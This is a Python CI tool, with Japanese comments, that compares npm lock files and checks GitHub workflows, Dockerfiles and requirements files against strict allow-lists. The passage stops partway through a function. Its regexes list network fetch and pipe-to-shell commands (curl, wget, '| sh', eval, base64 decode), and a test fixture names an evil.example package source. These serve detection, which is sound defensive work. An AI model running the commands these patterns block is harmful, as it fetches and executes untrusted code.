#!/usr/bin/env python3
"""deps_diff — 部品の一覧（SBOM）の差分。main の lock の file と、PR の lock の file を比べる。

使い方: deps_diff.py <main の package-lock.json> <PR の package-lock.json> [--github]   /   deps_diff.py --selftest
見るもの（npm の lock の file の形 2 と 3。packages の表を読む）:
  1. 新しい部品、版の変わった部品、消えた部品。どれも NOTICE の行に出し、終了コード 3 で知らせる（鳴らす）。
  2. 止める物（終了コード 1）: 取り込み元が公開の登録所（registry.npmjs.org）の外、指紋（integrity）の無い部品、
     版を変えずに指紋だけが変わった部品、新しく入れ時の命令（install の script）を持った部品。
--github を付けると、GitHub Actions の注記（::warning と ::error）と、job の要約に貼れる表で出す。
許す形の一覧の検査（拒む一覧にしない。一覧の外の書き方は全部落とす。終了コード 0 か 1）:
  deps_diff.py --uses <workflow と action.yml の file...>: uses の行は「- uses: 持ち主/名前@40 桁の SHA」か
    「./.github/actions/<名前>」の 1 行だけ（手元の部品の置き場は .github/actions に限る。持ち主の欄の内側で、確かめる file の集まりに入る）。
    run の文字の塊の中の外からの取り出し（curl、wget、npx、pip install、git clone、shell への流し込みなど）も落とす。
    許すのは、機械の OIDC の窓口から札を取る 1 行の形（ACTIONS_ID_TOKEN_REQUEST_URL）だけで、道具の本体は repo に固定した版と
    SHA-256 で取る（tools/ci/fetch-terraform.sh。この形は取り出しの語を含まない）。
    流れの書き方（{uses: …}）、引用した鍵（"uses":）、折り返し（uses: >-）、別名（*a）、符号（\x73）は、どれも形の外で落ちる。
    文字の塊（run: | の中身）は鍵にならないので見ない。
  deps_diff.py --uses-remote <固定した部品の action.yml...>: 組み立ての型（composite）の中の uses も 40 桁の SHA だけ（./ も落とす）。
    外の組み立ての型は、固定した部品を組むだけにする。run の step は 1 つも許さない（中で外から取る物は、SHA で固まらないため）。
  空の file、runs の無い file、一覧の外の using、ダイジェストで固定しない image も落とす（取り出しの失敗を黙って通さない）。
    外の SHA を固定しても、中の uses が版の札なら中身が動くからである。
  --uses でも、像の行（workflow の container: と services: の image:、手元の部品の runs.image）は「名前@sha256:64 桁」だけを許す。
    手元の部品（action.yml と action.yaml）にも --uses-remote と同じ形の確かめ（using の一覧、image のダイジェスト）を掛ける
    （image: Dockerfile は落ちる）。docker build と buildx と run も取り出しの語に入れ、許すのは「docker pull 名前@sha256:」と
    「docker build --network=none --pull=false」の形だけ（土台はダイジェストで先に取り、作る間は網に出ない）。
  資格を借りる job の決まり（第 16 回。許す形の一覧で読む）:
    見分け: permissions は塊の形の「名前: read|write|none」か read-all か {} だけ。流れの書き方、引用した鍵、別名は形の外で落とし、
    その job を資格を借りる job と見なす。id-token と write-all の語は、書き方を問わず資格の印にする（id-token: none の 1 行を除く）。
    container: と services: を置かない（job の step が全部、札の像の中で動くため）。
    run は許す行の一覧だけ: set の行、tools/ci/ の file をこの実行の SHA で機械の gh で取る 1 行、その file を bash で呼ぶ 1 行。
    環境変数の名前は許す一覧だけ（GITHUB_* と RUNNER_TEMP の上書き、BASH_ENV などを入れない）。working-directory は使わせない。
    手元の部品の run にも同じ決まりを掛ける（資格を借りる job から呼ばれうるため）。
  shell: の行は bash だけ（workflow、手元の部品、defaults.run.shell）。run の鍵の流れの書き方と引用も落とす。
  docker と docker-compose の語は、どの job でも、引用と逆斜線を外した形でも拾う。許すのはダイジェストの pull、網の無い build
    （-f は Dockerfile の名の型だけ）、決めた save、使い捨ての容器の作りの 4 つの形だけ。gh extension、外の repo の gh run download、
    eval、base64 の戻しも取り出しの語に入れる。
  deps_diff.py --dockerfile <Dockerfile...>: FROM は「名前@sha256:64 桁」か、前の段の名前だけ。ADD の URL と git、RUN --network も落ちる。
    作りの道具を替える指示（# syntax=、# escape=、# check=）と、COPY/ADD の --from と RUN --mount の from= の札の像も落ちる（第 16 回）。
  deps_diff.py --scripts <package.json...>: scripts の命令に外からの取り出し（npx、curl、npm exec など。FETCH と同じ一覧）があれば落とす。
    作る job は網の無い場所で動くので、取り出しは作る間に落ちる。この検査は、それを PR の段で先に見つける。
  deps_diff.py --requirements <requirements*.txt...>: 通すのは「名前==版」の行（extras と環境の印は可）、--hash=sha256: の続きの行、
    コメント、空行だけ。-f、--find-links、--trusted-host、-r、-c、--no-index、-e、--index-url、名前 @ URL は落ちる。
    「名前==版」の行には 1 つ以上の指紋が要る。
出力: NOTICE|FAIL <部品> [<決まり>] <内容>、最後に RESULT: PASS|NOTICE|FAIL deps-diff (新 N、版 N、消 N、止 N)。
終了コード: 変化なし 0、変化あり 3、止める物あり 1。読めない file は 1。
"""
import json
import pathlib
import re
import shutil
import sys
import tempfile

REGISTRY = "https://registry.npmjs.org/"


def load(path):
    data = json.loads(pathlib.Path(path).read_text(encoding="utf-8"))
    pk = data.get("packages")
    if pk is None:
        raise ValueError("packages の表が無い（lock の file の形 2 か 3 にする）")
    return {k: v for k, v in pk.items() if k}


def name_of(key):
    return key.split("node_modules/")[-1]


def diff(base, head):
    new, changed, gone, stop = [], [], [], []
    for key, h in sorted(head.items()):
        if h.get("link"):
            continue
        b = base.get(key)
        res = str(h.get("resolved", ""))
        if not res.startswith(REGISTRY):
            stop.append((key, "取り込み元", f"取り込み元が登録所の外: {res or '（書かれていない）'}"))
        if not h.get("integrity"):
            stop.append((key, "指紋", "integrity（指紋）が無い"))
        if b is None:
            new.append((key, f"新しい部品 {name_of(key)}@{h.get('version')}"))
            if h.get("hasInstallScript"):
                stop.append((key, "入れ時の命令", "新しい部品が install の script を持つ"))
            continue
        if b.get("version") != h.get("version"):
            changed.append((key, f"版が変わる {b.get('version')} → {h.get('version')}"))
        elif b.get("integrity") != h.get("integrity"):
            stop.append((key, "指紋", f"版 {h.get('version')} のまま指紋が変わる"))
        if h.get("hasInstallScript") and not b.get("hasInstallScript"):
            stop.append((key, "入れ時の命令", "install の script を新しく持つ"))
    for key in sorted(set(base) - set(head)):
        gone.append((key, f"消えた部品 {name_of(key)}@{base[key].get('version')}"))
    return new, changed, gone, stop


def report(base_path, head_path, github=False):
    try:
        base, head = load(base_path), load(head_path)
    except (OSError, ValueError) as e:
        print(f"FAIL {head_path} [読めない] {e}")
        print("RESULT: FAIL deps-diff (読めない)")
        return 1
    new, changed, gone, stop = diff(base, head)
    if github and (new or changed or gone or stop):
        print(f"### 部品の差分 {head_path}\n\n| 部品 | 中身 |\n|---|---|")
        for key, msg in new + changed + gone:
            print(f"| {name_of(key)} | {msg} |")
        for key, rule, msg in stop:
            print(f"| {name_of(key)} | 止める（{rule}）: {msg} |")
        print()
    for key, msg in new + changed + gone:
        print(f"::warning file={head_path}::{name_of(key)} {msg}" if github else f"NOTICE {name_of(key)} [部品の差分] {msg}")
    for key, rule, msg in stop:
        print(f"::error file={head_path}::{name_of(key)} {msg}" if github else f"FAIL {name_of(key)} [{rule}] {msg}")
    counts = f"新 {len(new)}、版 {len(changed)}、消 {len(gone)}、止 {len(stop)}"
    if stop:
        print(f"RESULT: FAIL deps-diff ({counts})")
        return 1
    if new or changed or gone:
        print(f"RESULT: NOTICE deps-diff ({counts})")
        return 3
    print(f"RESULT: PASS deps-diff ({counts})")
    return 0


def selftest():
    import contextlib
    import io
    tmp = pathlib.Path(tempfile.mkdtemp(prefix="deps-diff-"))
    ok_pkg = {"version": "1.0.0", "resolved": REGISTRY + "a/-/a-1.0.0.tgz", "integrity": "sha512-AAAA"}

    def lock(name, packages):
        f = tmp / f"{name}.json"
        f.write_text(json.dumps({"lockfileVersion": 3, "packages": {"": {"name": "web"}, **packages}}), encoding="utf-8")
        return str(f)

    base = lock("base", {"node_modules/a": ok_pkg})
    cases = [
        ("変化の無い lock が通らない", lock("same", {"node_modules/a": ok_pkg}), 0, "RESULT: PASS"),
        ("新しい部品で鳴らない", lock("new", {"node_modules/a": ok_pkg, "node_modules/b": {**ok_pkg, "resolved": REGISTRY + "b/-/b-1.0.0.tgz"}}), 3, "新しい部品 b@1.0.0"),
        ("版の変更で鳴らない", lock("ver", {"node_modules/a": {**ok_pkg, "version": "1.0.1", "integrity": "sha512-BBBB"}}), 3, "1.0.0 → 1.0.1"),
        ("登録所の外の取り込み元で止まらない", lock("src", {"node_modules/a": {**ok_pkg, "resolved": "https://evil.example/a.tgz"}}), 1, "[取り込み元]"),
        ("版を変えない指紋の変更で止まらない", lock("int", {"node_modules/a": {**ok_pkg, "integrity": "sha512-CCCC"}}), 1, "[指紋]"),
        ("新しい入れ時の命令で止まらない", lock("scr", {"node_modules/a": {**ok_pkg, "hasInstallScript": True}}), 1, "[入れ時の命令]"),
        ("消えた部品で鳴らない", lock("gone", {}), 3, "消えた部品 a@1.0.0"),
    ]
    good = True
    try:
        for name, head, want_rc, want_text in cases:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = report(base, head)
            if rc != want_rc or want_text not in buf.getvalue():
                good = False
                print(f"FAIL selftest deps-diff: {name}（終了コード {rc}）: {buf.getvalue()[-200:]}")
        form_good, form_n = form_selftest(tmp)
        good = good and form_good
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    print(f"RESULT: {'PASS' if good else 'FAIL'} deps-diff --selftest ({len(cases) + form_n} 例)")
    return 0 if good else 1


# ---- 許す形の一覧（uses の行と requirements の行）

SHA_REF = r"[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@[0-9a-f]{40}"
# 手元の再利用の workflow（job の uses: ./.github/workflows/<名前>.yml）も持ち主の欄の内側なので許す。中身も --uses で確かめる。
USES_LOCAL = re.compile(r"^\s*(-\s+)?uses:\s+(\./\.github/actions/[A-Za-z0-9_-]+(/[A-Za-z0-9_-]+)*|\./\.github/workflows/[A-Za-z0-9_-]+\.ya?ml|"
                        + SHA_REF + r")\s*(#.*)?$")
USES_REMOTE = re.compile(r"^\s*(-\s+)?uses:\s+(" + SHA_REF + r"|docker://[^\s@]+@sha256:[0-9a-f]{64})\s*(#.*)?$")
BLOCK_START = re.compile(r"[:\-]\s*[|>][0-9+-]*\s*(#.*)?$")
RUN_KEY = re.compile(r"^\s*(-\s+)?run\s*:", re.I)
# 外から物を取る命令と、取った物を shell へ流し込む形。run の行（文字の塊の中も）で探す。引用と逆斜線を外した形でも探す（"docker" や do""cker）。
# 第 16 回: gh extension、gh run download の -R と --repo（外の repo の束）、docker と docker-compose の語（どの位置でも。許すのは下の形だけ）、
# eval と base64 の戻し（語を組み立てて動かす形）も入れる。
FETCH = re.compile(r"(?i)(\b(curl|wget|npx|pnpx|bunx|uvx|pipx|iwr|irm)\b|invoke-(webrequest|restmethod)|\b(pip3?|uv\s+pip|python3?\s+-m\s+pip)\s+install\b"
                   r"|\bnpm\s+(install|i|exec|x|add)\b|\b(yarn|pnpm)\s+(add|dlx|install)\b|\bgo\s+(install|get)\b|\b(cargo|gem)\s+install\b"
                   r"|\bgit\s+(clone|fetch|pull|submodule)\b|\bgh\s+(release|repo)\s+(download|clone)\b|\bgh\s+(extension|extensions|ext)\b"
                   r"|\bgh\s+run\s+download\b.*\s(-R|--repo)(\s|=)|\bdocker(-compose)?\b|\b(podman|buildah|nerdctl|skopeo|crane|oras|kaniko)\b"
                   r"|\beval\b|\bbase64\s+(-d|-D|--decode)\b"
                   r"|\|\s*(sudo\s+)?(ba|z|da)?sh\b|\b(ba)?sh\s+<\(|https?://)")
# Dockerfile の名前の型（deps-diff.yml の git ls-files の型と同じ。この外の file は --dockerfile が見ないので、-f に書かせない）。
DOCKERFILE_NAME = r"([A-Za-z0-9_./-]*/)?(Dockerfile(\.[A-Za-z0-9_-]+)?|[A-Za-z0-9_-]+\.dockerfile)"
DIGEST_REF = r"[a-z0-9][a-z0-9._/-]*@sha256:[0-9a-f]{64}"
# 許す取り出しの形（1 行ごと）。機械の OIDC の窓口から札を取る行（tools/ci/ の file の中の形と同じ）と、docker の 4 つの形だけ。
FETCH_OK = (re.compile(r'^\s*tok=\$\(curl -fsS -H "Authorization: bearer \$\{ACTIONS_ID_TOKEN_REQUEST_TOKEN\}" '
                       r'"\$\{ACTIONS_ID_TOKEN_REQUEST_URL\}&audience=sts\.amazonaws\.com" \| jq -r \.value\)\s*$'),
            # 土台の像をダイジェストで取る（作る前の別の step）。札の像は形の外で落ちる。
            re.compile(r"^\s*docker pull ['\"]?" + DIGEST_REF + r"['\"]?\s*$"),
            # 網の無い作り。土台は上の形で取った物だけを使う（--pull=false）。-f は Dockerfile の名前の型だけ（-f - と Containerfile を落とす）。
            re.compile(r"^\s*docker build --network=none --pull=false( -t ['\"]?[A-Za-z0-9_${}.:/-]+['\"]?)? -f " + DOCKERFILE_NAME + r" [A-Za-z0-9_./-]+\s*$"),
            # 作った像を束にする（名前と置き場は決めた形だけ）。
            re.compile(r'^\s*docker save [a-z0-9][a-z0-9-]* -o "\$\{RUNNER_TEMP\}/[A-Za-z0-9_./-]+\.tar"\s*$'),
            # 画面の網の無い作り（第 16 回）。使い捨ての容器で、web/ の写しだけを渡し、dist だけを外へ出す（static-build.yml）。
            re.compile(r'^\s*docker run --rm --network=none --user "\$\(id -u\):\$\(id -g\)" -v "\$\{RUNNER_TEMP\}/build-src:/w" -w /w '
                       + DIGEST_REF + r" npm run build\s*$"))


def fetch_hit(line):
    """run の 1 行が、許す形の外の取り出しを含むか。引用と逆斜線を外した形でも探す。"""
    text = line.split(" #")[0] if not line.strip().startswith("#") else ""
    plain = re.sub(r"[\"'\\]", "", text)
    if not (FETCH.search(text) or FETCH.search(plain)):
        return False
    return not any(f.match(line) for f in FETCH_OK)


RUNS_LINE = re.compile(r"^runs:\s*(#.*)?$")
USING_OK = re.compile(r"^\s+using:\s+['\"]?(composite|node20|node24|docker)['\"]?\s*(#.*)?$")
IMAGE_OK = re.compile(r"^\s+image:\s+['\"]?docker://[^\s@'\"]+@sha256:[0-9a-f]{64}['\"]?\s*(#.*)?$")
TEXT_KEY = re.compile(r"^\s*(-\s+)?(name|description|default|deprecationMessage|icon|color|author):\s")
# workflow の像の行。container: と services: の image: は「名前@sha256:64 桁」の 1 行だけ（札は作り手が動かせる）。
DIGEST_IMAGE = r"['\"]?[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}['\"]?"
WF_IMAGE_OK = (re.compile(r"^\s*(-\s+)?image:\s+" + DIGEST_IMAGE + r"\s*(#.*)?$"),
               re.compile(r"^\s*(-\s+)?container:\s+" + DIGEST_IMAGE + r"\s*(#.*)?$"),
               re.compile(r"^\s*(-\s+)?(container|services):\s*(#.*)?$"))
IMAGE_KEY = re.compile(r"(container|services|image)", re.I)
CRED_KEY = re.compile(r"^\s*(-\s+)?['\"]?(container|services)['\"]?\s*:", re.I)
# 資格を借りる job の見分け（第 16 回。許す形の一覧で読む）。permissions の行は「permissions:」の塊か read-all か {} だけを許し、
# 塊の中は「名前: read|write|none」の行だけを許す。流れの書き方、引用した鍵、別名は形の外で、資格を借りる job と見なして落とす。
# id-token と write-all の語は、書き方を問わず資格を借りる印にする（id-token: none の 1 行だけを除く）。
PERM_KEY = re.compile(r"['\"]?permissions['\"]?\s*:", re.I)
PERM_OK = re.compile(r"^\s*permissions:\s*(read-all|\{\})?\s*(#.*)?$")
PERM_CHILD = re.compile(r"^\s+[a-z][a-z-]*:\s+(read|write|none)\s*(#.*)?$")
ID_TOKEN_NONE = re.compile(r"^\s*id-token:\s+none\s*(#.*)?$")
# 資格を借りる job の run は、許す行の一覧だけ（第 16 回。拒む語を並べない）。通すのは次の 3 つの形と、空行とコメントだけ。
#   1. set -eu などの shell の設定。
#   2. 自分の repo の tools/ci/ の file を、この実行の SHA で機械の gh で取る 1 行（外の部品の checkout を使わない）。
#   3. tools/ci/ の file か、2 で取った file を bash で呼ぶ 1 行（引数は小文字の語か "${RUNNER_TEMP}/..." だけ）。
# 札の取り出し、aws、gh、docker、組み立ての道具は、どれも tools/ci/ の file の中に置く（持ち主の欄でセキュリティが読む）。
CRED_RUN_OK = (
    re.compile(r"^set -[a-z]+( -o pipefail| pipefail)?$|^set -o pipefail$"),
    re.compile(r'^gh api -H "Accept: application/vnd\.github\.raw" "repos/\$\{GITHUB_REPOSITORY\}/contents/tools/ci/[A-Za-z0-9_-]+\.(sh|json)'
               r'\?ref=\$\{GITHUB_SHA\}" > "\$\{RUNNER_TEMP\}/[A-Za-z0-9_-]+\.(sh|json)"$'),
    re.compile(r'^bash ("\$\{RUNNER_TEMP\}/[A-Za-z0-9_-]+\.sh"|tools/ci/[A-Za-z0-9_-]+\.sh)'
               r'( ([a-z0-9][a-z0-9-]*|"\$\{RUNNER_TEMP\}(/[A-Za-z0-9_.-]+)*"))*$'),
)
# 資格を借りる job の環境変数の名前は、許す一覧だけ（BASH_ENV、LD_PRELOAD、NODE_OPTIONS のように、shell や道具が読んで動く名前を入れない）。
CRED_ENV_OK = {"GH_TOKEN", "REPO", "RUN_ID", "RUN_ATTEMPT", "ROLE_ARN", "SESSION", "BUCKET", "REGISTRY", "PREFIX", "DIGEST", "BASE_REF"}
ENV_KEY = re.compile(r"^\s*(-\s+)?['\"]?env['\"]?\s*:\s*(.*)$", re.I)
ENV_CHILD = re.compile(r"^\s+([A-Z][A-Z0-9_]*):(\s|$)")
# shell: の行は bash だけ（第 16 回）。workflow でも手元の部品でも、defaults.run.shell でも同じ。python や pwsh で本文を書く形を落とす。
SHELL_KEY = re.compile(r"['\"]?shell['\"]?\s*:", re.I)
SHELL_OK = re.compile(r"^\s*(-\s+)?shell:\s+bash\s*(#.*)?$")
WORKDIR_KEY = re.compile(r"working-directory", re.I)


def cred_run_problems(line):
    """資格を借りる job の run の 1 行が、許す行の一覧の外なら、その理由を返す。"""
    text = line.strip()
    if not text or text.startswith("#") or any(f.match(text) for f in CRED_RUN_OK):
        return []
    return ["許す行の一覧の外（tools/ci/ の file を取る行と呼ぶ行、set だけを許す）"]


def cred_markers(lines):
    """資格を借りる印の行の番号と、permissions の形の外の行の番号を返す。"""
    marks, bad, perm_ind = set(), set(), None
    for i, x in enumerate(lines):
        st = x.strip()
        if not st or st.startswith("#"):
            continue
        ind = len(x) - len(x.lstrip(" "))
        if perm_ind is not None:
            if ind > perm_ind:
                if not PERM_CHILD.match(x):
                    bad.add(i)
                    marks.add(i)
                if re.search(r"id-token", x, re.I) and not ID_TOKEN_NONE.match(x):
                    marks.add(i)
                continue
            perm_ind = None
        if PERM_KEY.search(x.split(" #")[0]):
            if not PERM_OK.match(x):
                bad.add(i)
                marks.add(i)
            elif re.match(r"^\s*permissions:\s*(#.*)?$", x):
                perm_ind = ind
        if (re.search(r"id-token", x, re.I) and not ID_TOKEN_NONE.match(x)) or re.search(r"write-all", x, re.I):
            marks.add(i)
    return marks, bad


def job_ranges(lines):
    """workflow の job ごとの (始まりの行, 終わりの行, 資格を借りるか) を返す。workflow の頭の資格の印は全部の job に効く。"""
    top = None
    for i, x in enumerate(lines):
        if re.match(r"^['\"]?jobs['\"]?\s*:\s*(#.*)?$", x):
            top = i
            break
    if top is None:
        return []
    marks, _ = cred_markers(lines)
    head_cred = any(i < top for i in marks)
    ind, starts = None, []
    for i in range(top + 1, len(lines)):
        x = lines[i]
        if not x.strip() or x.strip().startswith("#"):
            continue
        k = len(x) - len(x.lstrip(" "))
        if k == 0:
            break
        if ind is None:
            ind = k
        if k == ind:
            starts.append(i)
    out = []
    for j, st in enumerate(starts):
        end = starts[j + 1] if j + 1 < len(starts) else len(lines)
        cred = head_cred or any(st <= i < end for i in marks)
        out.append((st, end, cred))
    return out


def env_problems(path, lines, cred_lines, top_end):
    """資格を借りる job（と、そういう job を持つ workflow の頭）の env の名前を、許す一覧で確かめる。"""
    bad, env_ind = [], None
    for i, x in enumerate(lines):
        st = x.strip()
        if not st or st.startswith("#"):
            continue
        ind = len(x) - len(x.lstrip(" "))
        if env_ind is not None:
            if ind > env_ind:
                m = ENV_CHILD.match(x)
                if not m or m.group(1) not in CRED_ENV_OK:
                    bad.append(f"{path}:{i + 1}: 資格を借りる job の環境変数が許す一覧の外: {st}")
                continue
            env_ind = None
        if (i in cred_lines or i < top_end) and ENV_KEY.match(x):
            rest = ENV_KEY.match(x).group(2).split(" #")[0].strip()
            if rest:
                bad.append(f"{path}:{i + 1}: 資格を借りる job の env の形の外（塊の形だけを許す）: {st}")
            else:
                env_ind = len(x) - len(x.lstrip(" -"))  # 「- env:」なら鍵の桁（- の後）で数える
    return bad


def check_remote_shape(path, text):
    """固定した部品の action.yml の形を、許す物の一覧で確かめる。取り出しに失敗した空の file、runs の無い file、
    一覧の外の using（composite、node20、node24、docker のほか）、ダイジェストで固定しない image は全部落とす。"""
    bad = []
    lines = text.splitlines()
    if not text.strip():
        return [f"{path}: 中身が空（取り出しに失敗したおそれ。部品の action.yml を確かめ切れない）"]
    if sum(1 for x in lines if RUNS_LINE.match(x)) != 1:
        bad.append(f"{path}: 行の頭の runs: が 1 つでない（流れの書き方や取り出しの失敗を含む）")
    usings = [x for x in lines if re.search(r"using", x, re.I) and not TEXT_KEY.match(x)]
    if len(usings) != 1 or not USING_OK.match(usings[0]):
        bad.append(f"{path}: using が許す一覧の外か、1 つでない: {[u.strip() for u in usings]}")
    for n, line in enumerate(lines, 1):
        if re.search(r"image", line, re.I) and not TEXT_KEY.match(line) and not IMAGE_OK.match(line):
            bad.append(f"{path}:{n}: image は docker://…@sha256: の 1 行だけを許す: {line.strip()}")
    return bad


RUN_ANY = re.compile(r"['\"]?\brun['\"]?\s*:", re.I)


def check_uses(paths, remote=False):
    """workflow と action.yml の uses の行を、許す形の一覧で確かめる。外れた行の一覧を返す。"""
    form = USES_REMOTE if remote else USES_LOCAL
    bad = []
    for path in paths:
        text = pathlib.Path(path).read_text(encoding="utf-8")
        is_action = pathlib.Path(path).name in ("action.yml", "action.yaml")
        if remote or is_action:
            # 手元の部品にも、外の部品と同じ形の確かめ（using の一覧、image のダイジェスト）を掛ける（第 15 回）。
            bad += check_remote_shape(path, text)
        lines = text.splitlines()
        ranges = [] if remote else job_ranges(lines)
        # 資格を借りる行の集まり。手元の部品は、資格を借りる job から呼ばれうるので、同じ決まりを掛ける。
        cred_lines = set(range(len(lines))) if (is_action and not remote) else {i for st, end, c in ranges if c for i in range(st, end)}
        if not remote and not is_action:
            _, perm_bad = cred_markers(lines)
            bad += [f"{path}:{i + 1}: permissions の形の外（塊の形の「名前: read|write|none」だけ。資格を借りる job と見なす）: {lines[i].strip()}"
                    for i in sorted(perm_bad)]
            top_end = ranges[0][0] if ranges else 0
            if any(c for _, _, c in ranges):
                bad += env_problems(path, lines, cred_lines, top_end)
        elif is_action:
            bad += env_problems(path, lines, cred_lines, 0)
        block = None  # 文字の塊の中身の字下げ（この深さより深い行は文字で、鍵にならない）
        in_run = False  # 文字の塊が run の中身か（中身の取り出しの命令を探す）
        for n, line in enumerate(lines, 1):
            ind = len(line) - len(line.lstrip(" "))
            cred = (n - 1) in cred_lines
            if block is not None:
                if not line.strip() or ind > block:
                    if in_run and not line.strip().startswith("#"):
                        if fetch_hit(line):
                            bad.append(f"{path}:{n}: run の中の外からの取り出し（許す形の外）: {line.strip()}")
                        if cred:
                            bad += [f"{path}:{n}: 資格を借りる job の run が {p}: {line.strip()}" for p in cred_run_problems(line)]
                    continue
                block, in_run = None, False
            stripped = line.strip()
            if stripped.startswith("#") or not stripped:
                continue
            code = line.split(" #")[0]
            if re.match(r"^\s*(-\s+)?\?(\s|$)", line):
                bad.append(f"{path}:{n}: 複雑な鍵の書き方（? の行。形の外）: {stripped}")
            if (RUN_ANY.search(code) and not RUN_KEY.match(line) and not TEXT_KEY.match(line)) or (RUN_KEY.match(line) and not re.match(r"^\s*(-\s+)?run:", line)):
                bad.append(f"{path}:{n}: run の鍵の書き方の外（流れの書き方、引用した鍵、大文字。形の外）: {stripped}")
            if SHELL_KEY.search(code) and not SHELL_OK.match(line):
                bad.append(f"{path}:{n}: shell は bash だけ（python や pwsh で本文を書く形と defaults.run.shell も含む）: {stripped}")
            if cred and WORKDIR_KEY.search(code):
                bad.append(f"{path}:{n}: 資格を借りる job の working-directory（tools/ci/ の道を束の中の file へ向ける形）: {stripped}")
            if RUN_KEY.match(line):
                body = re.sub(RUN_KEY, "", line, count=1)
                is_block = bool(BLOCK_START.search(code))
                if remote:
                    bad.append(f"{path}:{n}: 外の組み立ての型の run の step（固定した部品を組むだけにする）: {stripped}")
                elif not is_block and fetch_hit(body):
                    bad.append(f"{path}:{n}: run の中の外からの取り出し（許す形の外）: {stripped}")
                if cred and not remote and not is_block:
                    bad += [f"{path}:{n}: 資格を借りる job の run が {p}: {stripped}" for p in cred_run_problems(body)]
                in_run = True
            if not remote and not is_action:
                key = line.split(":")[0]
                if IMAGE_KEY.search(key) and not TEXT_KEY.match(line) and not any(f.match(line) for f in WF_IMAGE_OK):
                    bad.append(f"{path}:{n}: 像の行の形の外（名前@sha256: の 1 行だけを許す）: {stripped}")
                elif "{" in code and re.search(r"(container|services|image)['\"]?\s*:", line, re.I):
                    bad.append(f"{path}:{n}: 流れの書き方の像の行（形の外）: {stripped}")
                if cred and CRED_KEY.match(line):
                    bad.append(f"{path}:{n}: 資格を借りる job に container か services（step が札の像の中で動く）: {stripped}")
            if "\t" in line[:ind + 1]:
                bad.append(f"{path}:{n}: 字下げにタブ（形の外）: {stripped}")
            keyish = re.search(r"uses", line, re.I) or ("\\" in line and '"' in line.split("#")[0])
            if keyish and not form.match(line):
                bad.append(f"{path}:{n}: uses の形の外（40 桁の SHA の 1 行だけを許す）: {stripped}")
            if BLOCK_START.search(code):
                block = ind
            else:
                in_run = False
    return bad


REQ_LINE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*(\[[A-Za-z0-9,._-]+\])?==[A-Za-z0-9.!+_-]+(\s*;\s*[A-Za-z0-9_ .<>=!'\"(),-]+)?"
                      r"(\s+--hash=sha256:[0-9a-f]{64})*\s*(\\)?$")
HASH_LINE = re.compile(r"^\s+--hash=sha256:[0-9a-f]{64}(\s+--hash=sha256:[0-9a-f]{64})*\s*(\\)?$")


def check_requirements(paths):
    """requirements の行を許す形の一覧で確かめる。外れた行の一覧を返す。"""
    bad = []
    for path in paths:
        lines = pathlib.Path(path).read_text(encoding="utf-8").splitlines()
        cont, hashes, head = False, 0, None
        for n, line in enumerate(lines + [""], 1):
            if cont:
                if not HASH_LINE.match(line):
                    bad.append(f"{path}:{n}: 指紋の続きの行の形の外: {line.strip()}")
                    cont = False
                    continue
                hashes += line.count("--hash=sha256:")
                cont = line.rstrip().endswith("\\")
                continue
            if head is not None and hashes == 0:
                bad.append(f"{path}:{head[0]}: 指紋（--hash=sha256:）の無い部品: {head[1]}")
            head = None
            stripped = line.strip()
            if not stripped or (stripped.startswith("#") and line.startswith("#")):
                continue
            if not REQ_LINE.match(line):
                bad.append(f"{path}:{n}: 許す形の外（名前==版と指紋の行だけ）: {stripped}")
                continue
            head, hashes = (n, stripped), line.count("--hash=sha256:")
            cont = line.rstrip().endswith("\\")
    return bad


FROM_LINE = re.compile(r"^\s*FROM\s+(--platform=\S+\s+)?(\S+)(\s+AS\s+([A-Za-z0-9_.-]+))?\s*$", re.I)
FROM_DIGEST = re.compile(r"^[a-z0-9][a-z0-9._/:-]*@sha256:[0-9a-f]{64}$")


DIRECTIVE = re.compile(r"^\s*#\s*(syntax|escape|check)\s*=", re.I)
FROM_OPT = re.compile(r"--from=([^\s,]+)", re.I)
MOUNT_FROM = re.compile(r"--mount=\S*?\bfrom=([^\s,]+)", re.I)


def check_dockerfile(paths):
    """Dockerfile の土台と取り込みを許す形で確かめる。FROM はダイジェストか前の段の名前だけ。ADD の URL と git、RUN --network は落ちる。
    第 16 回: 作りの道具を替える指示（# syntax= と # escape= と # check=）、COPY --from と RUN --mount の from= の札の像も落とす
    （from= は前の段の名前か、名前@sha256: の 64 桁だけ）。"""
    bad = []
    for path in paths:
        raw = pathlib.Path(path).read_text(encoding="utf-8").splitlines()
        for n, x in enumerate(raw, 1):
            if DIRECTIVE.match(x):
                bad.append(f"{path}:{n}: 作りの道具を替える指示（# syntax= など。札の作りの道具が像に入る）: {x.strip()}")
        lines, buf, start = [], "", 0
        for n, x in enumerate(raw, 1):
            if not buf:
                start = n
            buf += x.rstrip("\\").rstrip() + " " if x.rstrip().endswith("\\") else x
            if not x.rstrip().endswith("\\"):
                lines.append((start, buf))
                buf = ""
        if buf:
            lines.append((start, buf))
        stages = set()
        count = 0

        def src_ok(ref):
            ref = ref.strip("'\"")
            return ref.lower() in stages or bool(FROM_DIGEST.match(ref)) or (ref.isdigit() and int(ref) < count)
        for n, line in lines:
            st = line.strip()
            if not st or st.startswith("#"):
                continue
            word = st.split()[0].upper()
            if word == "FROM":
                m = FROM_LINE.match(st)
                if not m or not (FROM_DIGEST.match(m.group(2)) or m.group(2).lower() in stages):
                    bad.append(f"{path}:{n}: FROM はダイジェスト（名前@sha256:64 桁）か前の段の名前だけ: {st}")
                if m and m.group(4):
                    stages.add(m.group(4).lower())
                count += 1
                continue
            if word in ("COPY", "ADD"):
                for ref in FROM_OPT.findall(st):
                    if not src_ok(ref):
                        bad.append(f"{path}:{n}: {word} --from は前の段の名前かダイジェストだけ: {st}")
            if word == "RUN":
                for ref in MOUNT_FROM.findall(st):
                    if not src_ok(ref):
                        bad.append(f"{path}:{n}: RUN --mount の from= は前の段の名前かダイジェストだけ: {st}")
            if word == "ADD" and re.search(r"(https?://|git@|\.git\b)", st, re.I):
                bad.append(f"{path}:{n}: ADD で外から取る（作る間は網に出ない）: {st}")
            elif word == "RUN" and re.search(r"--network", st, re.I):
                bad.append(f"{path}:{n}: RUN --network（作る間の網を開ける）: {st}")
            elif word == "ONBUILD":
                bad.append(f"{path}:{n}: ONBUILD（後の作りに命令を残す）: {st}")
    return bad


def check_scripts(paths):
    """package.json の scripts に、外から取る命令（FETCH と同じ一覧）があれば落とす。"""
    bad = []
    for path in paths:
        try:
